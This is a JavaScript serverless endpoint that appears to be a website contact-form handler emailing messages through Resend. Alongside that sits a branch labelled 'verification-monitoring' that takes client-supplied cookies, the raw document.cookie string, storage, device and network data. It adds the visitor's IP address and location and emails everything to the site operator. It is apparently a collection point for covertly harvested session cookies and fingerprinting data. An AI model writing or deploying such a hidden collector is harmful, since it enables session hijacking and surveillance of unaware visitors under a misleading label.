const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

export default async function handler(request, response) {
  if (request.method !== "POST") {
    response.setHeader("Allow", "POST");
    return response.status(405).json({ error: "Method not allowed." });
  }

  const { name, email, message, website, type, telemetry } = request.body || {};
    const reportToEmail = process.env.REPORT_TO_EMAIL || process.env.RESPONSE_EMAIL;
    const reportFromEmail = process.env.REPORT_FROM_EMAIL || process.env.RESEND_FROM;

  if (type === "verification-monitoring") {
      return sendVerificationReport(request, response, telemetry, reportToEmail, reportFromEmail);
  }

  if (website || typeof name !== "string" || typeof email !== "string" || typeof message !== "string") {
    return response.status(400).json({ error: "Please complete all fields." });
  }

  const cleanName = name.trim();
  const cleanEmail = email.trim();
  const cleanMessage = message.trim();
  if (
    !cleanName ||
    cleanName.length > 120 ||
    cleanEmail.length > 254 ||
    cleanMessage.length > 5000 ||
    !emailPattern.test(cleanEmail) ||
    !cleanMessage
  ) {
    return response.status(400).json({ error: "Please enter a valid name, email, and message." });
  }

    if (!process.env.RESEND_API_KEY || !reportToEmail || !reportFromEmail) {
    return response.status(500).json({ error: "Email service is not configured." });
  }

  try {
    const resendResponse = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${process.env.RESEND_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        from: reportFromEmail,
        to: [reportToEmail],
        reply_to: cleanEmail,
        subject: `New contact message from ${cleanName}`,
        text: `Name: ${cleanName}\nEmail: ${cleanEmail}\n\n${cleanMessage}`
      })
    });

    if (!resendResponse.ok) {
      console.error("Resend API error:", resendResponse.status, await resendResponse.text());
      return response.status(502).json({ error: "Email provider rejected the message." });
    }

    return response.status(200).json({ ok: true });
  } catch (error) {
    console.error("Email sending error:", error);
    return response.status(502).json({ error: "Unable to reach the email provider." });
  }
}

async function sendVerificationReport(request, response, telemetry, reportToEmail, reportFromEmail) {
  if (!telemetry || typeof telemetry !== "object") {
    return response.status(400).json({ error: "Invalid monitoring data." });
  }

  if (!process.env.RESEND_API_KEY || !reportToEmail || !reportFromEmail) {
    return response.status(500).json({ error: "Email service is not configured." });
  }

  const forwardedFor = request.headers["x-forwarded-for"];
  const ipAddress = typeof forwardedFor === "string"
    ? forwardedFor.split(",")[0].trim()
    : request.socket?.remoteAddress || "Unavailable";
  const location = [
    request.headers["x-vercel-ip-city"],
    request.headers["x-vercel-ip-country"],
    request.headers["x-vercel-ip-country-region"]
  ].filter(Boolean).join(", ") || "Unavailable";

  const fullTelemetry = {
    timestamp: typeof telemetry.timestamp === "string" ? telemetry.timestamp : new Date().toISOString(),
    device: telemetry.device ?? {},
    browser: telemetry.browser ?? {},
    display: telemetry.display ?? {},
    network: telemetry.network ?? {},
    storage: telemetry.storage ?? {},
    cookies: telemetry.cookies ?? [],
    documentCookie: telemetry.documentCookie ?? ""
  };

  try {
    const resendResponse = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${process.env.RESEND_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        from: reportFromEmail,
        to: [reportToEmail],
        reply_to: reportFromEmail,
        subject: "Verification monitoring event",
        text: [
          `Timestamp: ${fullTelemetry.timestamp}`,
          `IP address: ${ipAddress}`,
          `Approximate location: ${location}`,
          "",
          "Telemetry:",
          JSON.stringify(fullTelemetry, null, 2)
        ].join("\n")
      })
    });

    if (!resendResponse.ok) {
      console.error("Resend API error:", resendResponse.status, await resendResponse.text());
      return response.status(502).json({ error: "Email provider rejected the report." });
    }

    return response.status(200).json({ ok: true });
  } catch (error) {
    console.error("Verification email error:", error);
    return response.status(502).json({ error: "Unable to reach the email provider." });
  }
}

